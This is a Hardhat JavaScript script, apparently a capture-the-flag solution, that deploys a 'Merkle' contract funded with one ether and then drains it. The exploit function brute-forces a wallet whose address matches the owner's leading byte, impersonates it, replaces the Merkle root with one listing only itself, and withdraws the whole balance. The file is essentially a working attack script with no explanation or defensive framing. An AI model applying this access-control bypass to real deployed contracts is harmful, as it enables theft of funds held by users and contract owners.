const { ethers } = require("hardhat");
const { MerkleTree } = require("merkletreejs");
const keccak256 = require("keccak256");
async function deploy(deployer) {
  const Merkle = await ethers.getContractFactory("Merkle", deployer);
  const oneEther = ethers.utils.parseEther("1");
  const merkle = await Merkle.deploy(
    "0x0000000000000000000000000000000000000000000000000000000000000000",
    { value: oneEther }
  );
  console.log("Merkle contract:", merkle.address);

  return merkle;
}

async function exploit(merkle) {
  console.log(
    "Before: Contract Balance:",
    await ethers.utils.formatEther(
      await ethers.provider.getBalance(merkle.address)
    )
  );
  let aim = (await merkle.owner()).toString().substr(2, 2).toLowerCase();
  while ((attacker = ethers.Wallet.createRandom())) {
    if (attacker.address.substr(2, 2).toLowerCase() == aim) {
      break;
    }
  }
  await ethers.provider.send("hardhat_setBalance", [
    attacker.address,
    "0xde0b6b3a7640000",
  ]);

  let attack = await ethers.getImpersonatedSigner(attacker.address);

  let whiteaddresslist = [attack.address];
  const leaves = whiteaddresslist.map((addr) => keccak256(addr));
  const tree = new MerkleTree(leaves, keccak256(), { sortPairs: true });

  await merkle.connect(attack).setMerkleroot(tree.getHexRoot());
  await merkle.connect(attack).withdraw([], attack.address);
  await merkle.connect(attack).Complete();
  console.log(
    "After: Contract Balance:",
    await ethers.utils.formatEther(
      await ethers.provider.getBalance(merkle.address)
    )
  );
}

async function main() {
  let deployer = await ethers.getSigners();
  let merkle = await deploy(deployer);
  exploit(merkle);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
